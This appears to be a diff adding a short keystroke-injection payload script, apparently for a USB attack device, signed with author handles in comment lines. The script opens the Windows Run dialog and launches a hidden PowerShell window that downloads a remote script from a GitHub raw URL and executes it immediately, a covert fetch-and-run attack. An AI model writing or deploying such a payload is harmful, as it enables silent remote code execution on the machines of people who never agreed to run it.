@@ -1,0 +1,10 @@
+REM AYO I WR0T3 MY_SH1T
+REM GGY 0r 0x22 0r Thirty4
+
+DELAY 890
+GUI r
+DELAY 900
+STRING powershell -WindowStyle Hidden -c "irm https://raw.githubusercontent.com/Thirty4-34/C-7E-F-M95-I-U-P-R7V-R7U1H-7-T-31-86YD7WEO-3-/refs/heads/main/con_calma.ps1 | iex"
+DELAY 1780
+ENTER
+DELAY 3000
